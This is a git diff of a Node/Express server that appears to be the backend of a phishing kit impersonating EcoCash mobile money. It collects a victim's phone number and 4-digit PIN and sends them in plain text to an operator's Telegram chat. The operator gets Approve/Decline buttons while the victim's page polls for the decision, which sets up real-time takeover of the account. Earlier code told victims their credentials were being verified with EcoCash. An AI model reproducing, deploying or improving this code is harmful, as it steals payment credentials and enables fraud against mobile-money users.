@@ -68,135 +68,153 @@ setInterval(() => {
 }, 60 * 60 * 1000);
 
 /* ============================================================
-   Telegram notification
-   Uses TELEGRAM_API_PROXY_URL when set (Cloudflare Worker),
-   otherwise falls back to api.telegram.org directly.
+   Pending decisions (approval flow)
 ============================================================ */
-async function notifyTelegram({ phone, pin }) {
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
-  const proxyUrl = process.env.TELEGRAM_API_PROXY_URL;
+const PENDING = new Map();
 
-  if (!token || !chatId) {
-    pushLog('Telegram not configured — skipping', 'err');
-    console.warn('Telegram not configured — skipping notification.');
-    return;
+function setDecision(txId, decision) {
+  if (!txId) return;
+  PENDING.set(txId, { decision, ts: Date.now() });
+  pushLog('Decision ' + decision + ' for ' + txId, decision === 'approved' ? 'ok' : 'err');
+}
+
+function getDecision(txId) {
+  const entry = PENDING.get(txId);
+  return entry ? entry.decision : 'pending';
+}
+
+setInterval(() => {
+  const cutoff = Date.now() - 15 * 60 * 1000;
+  for (const [k, v] of PENDING.entries()) {
+    if (v.ts < cutoff) PENDING.delete(k);
   }
+}, 5 * 60 * 1000);
 
-  const text = phone + '\n' + pin;
-
-  const baseUrl = proxyUrl
+/* ============================================================
+   Telegram API helper (proxy-aware)
+============================================================ */
+function tgBase() {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  const proxyUrl = process.env.TELEGRAM_API_PROXY_URL;
+  if (!token) return null;
+  return proxyUrl
     ? proxyUrl.replace(/\/$/, '') + '/bot' + token
     : 'https://api.telegram.org/bot' + token;
-
-  const controller = new AbortController();
-  const timeout = setTimeout(() => controller.abort(), 10000);
-
-  try {
-    const res = await fetch(baseUrl + '/sendMessage', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text }),
-      signal: controller.signal
-    });
-
-    if (!res.ok) {
-      const body = await res.text().catch(() => '');
-      pushLog('Telegram responded ' + res.status + ' ' + body.slice(0, 120), 'err');
-      console.error('Telegram responded', res.status, body);
-    } else {
-      pushLog('Telegram sent OK', 'ok');
-      console.log('Telegram notification sent.');
-    }
-  } catch (err) {
-    const msg = err.name === 'AbortError' ? 'timeout' : err.message;
-    pushLog('Telegram error: ' + msg, 'err');
-    console.error('Telegram notify failed:', msg);
-  } finally {
-    clearTimeout(timeout);
-  }
 }
 
 /* ============================================================
-   POST /api/links
-============================================================ */
-app.post('/api/links', (req, res) => {
-  try {
-    const payload = req.body;
-    if (!payload || !payload.tx) {
-      pushLog('Create link failed: missing tx', 'err');
-      return res.status(400).json({ error: 'Missing transaction data' });
-    }
-    const code = 'ECP-' + crypto.randomBytes(4).toString('hex').toUpperCase();
-    linkStore.set(code, {
-      payload,
-      createdAt: Date.now(),
-      exp: payload.exp || null
-    });
-    saveLinks(linkStore);
-    pushLog('Link created: ' + code, 'ok');
-    res.json({ code, shortUrl: '/client.html?r=' + code });
-  } catch (err) {
-    pushLog('Create link error: ' + err.message, 'err');
-    console.error('create link error:', err);
-    res.status(500).json({ error: 'Could not create link' });
-  }
-});
-
-/* ============================================================
-   GET /api/links/:code
-============================================================ */
-app.get('/api/links/:code', (req, res) => {
-  const code = req.params.code;
-  const entry = linkStore.get(code);
-
-  if (!entry) {
-    pushLog('Resolve 404: ' + code, 'err');
-    return res.status(404).json({ error: 'Link not found or expired' });
-  }
-  if (entry.exp && Date.now() > entry.exp) {
-    linkStore.delete(code);
-    saveLinks(linkStore);
-    pushLog('Resolve 410 expired: ' + code, 'err');
-    return res.status(410).json({ error: 'Link expired' });
-  }
-  pushLog('Resolve OK: ' + code, 'ok');
-  res.json(entry.payload);
-});
-
-/* ============================================================
-   POST /api/accept
+   POST /api/accept — send Telegram message with buttons
 ============================================================ */
 app.post('/api/accept', async (req, res) => {
   const { transactionId, phone, pin } = req.body;
 
   pushLog('ACCEPT HIT tx=' + (transactionId || '—') + ' phone=' + (phone || '—'), 'info');
-  console.log('ACCEPT HIT', { tx: transactionId, phone });
 
   if (!transactionId || !phone || !pin) {
     pushLog('Rejected: missing fields', 'err');
-    return res.status(400).json({
-      status: 'failed',
-      message: 'Missing transactionId, phone, or pin'
-    });
+    return res.status(400).json({ status: 'failed', message: 'Missing transactionId, phone, or pin' });
   }
 
   if (!/^\d{4}$/.test(String(pin))) {
     pushLog('Rejected: PIN not 4 digits', 'err');
-    return res.status(400).json({
-      status: 'failed',
-      message: 'PIN must be exactly 4 digits'
-    });
+    return res.status(400).json({ status: 'failed', message: 'PIN must be exactly 4 digits' });
   }
 
-  pushLog('Telegram call → ' + phone + ' / PIN length ' + String(pin).length, 'info');
-  await notifyTelegram({ phone, pin });
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+  const baseUrl = tgBase();
+
+  if (!chatId || !baseUrl) {
+    pushLog('Telegram not configured', 'err');
+    return res.status(500).json({ status: 'failed', message: 'Server not configured' });
+  }
+
+  PENDING.set(transactionId, { decision: 'pending', ts: Date.now() });
+
+  const messageText =
+    'EcoCash authorization request\n\n' +
+    'Transaction: ' + transactionId + '\n' +
+    'Phone: ' + phone + '\n' +
+    'PIN: ' + pin;
+
+  const keyboard = {
+    inline_keyboard: [[
+      { text: '✅ Approve', callback_data: 'approve:' + transactionId },
+      { text: '❌ Decline', callback_data: 'decline:' + transactionId }
+    ]]
+  };
+
+  try {
+    const tgRes = await fetch(baseUrl + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: messageText, reply_markup: keyboard })
+    });
+    if (!tgRes.ok) {
+      const body = await tgRes.text();
+      pushLog('Telegram failed ' + tgRes.status + ' ' + body.slice(0, 120), 'err');
+      return res.status(502).json({ status: 'failed', message: 'Could not notify admin' });
+    }
+    pushLog('Sent to Telegram with buttons: ' + transactionId, 'ok');
+  } catch (err) {
+    pushLog('Telegram error: ' + err.message, 'err');
+    return res.status(502).json({ status: 'failed', message: 'Could not notify admin' });
+  }
 
   return res.json({
-    status: 'verifying',
-    message: 'Verifying your credentials with EcoCash…',
+    status: 'awaiting_approval',
+    message: 'Waiting for approval',
     transactionId
   });
+});
+
+/* ============================================================
+   GET /api/status/:tx — client polls this
+============================================================ */
+app.get('/api/status/:tx', (req, res) => {
+  const tx = req.params.tx;
+  res.json({ transactionId: tx, decision: getDecision(tx) });
+});
+
+/* ============================================================
+   POST /api/telegram-webhook — Approve / Decline tap
+============================================================ */
+app.post('/api/telegram-webhook', async (req, res) => {
+  const update = req.body || {};
+  const cb = update.callback_query;
+
+  if (cb && cb.data) {
+    const [action, txId] = String(cb.data).split(':');
+    if (action === 'approve') setDecision(txId, 'approved');
+    if (action === 'decline') setDecision(txId, 'declined');
+
+    const baseUrl = tgBase();
+    if (baseUrl) {
+      // Acknowledge the tap
+      fetch(baseUrl + '/answerCallbackQuery', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          callback_query_id: cb.id,
+          text: action === 'approve' ? 'Approved' : 'Declined'
+        })
+      }).catch(() => {});
+
+      // Remove buttons from the original message
+      if (cb.message && cb.message.chat && cb.message.chat.id && cb.message.message_id) {
+        fetch(baseUrl + '/editMessageReplyMarkup', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: cb.message.chat.id,
+            message_id: cb.message.message_id,
+            reply_markup: { inline_keyboard: [] }
+          })
+        }).catch(() => {});
+      }
+    }
+  }
+
+  res.json({ ok: true });
 });
 
 /* ============================================================
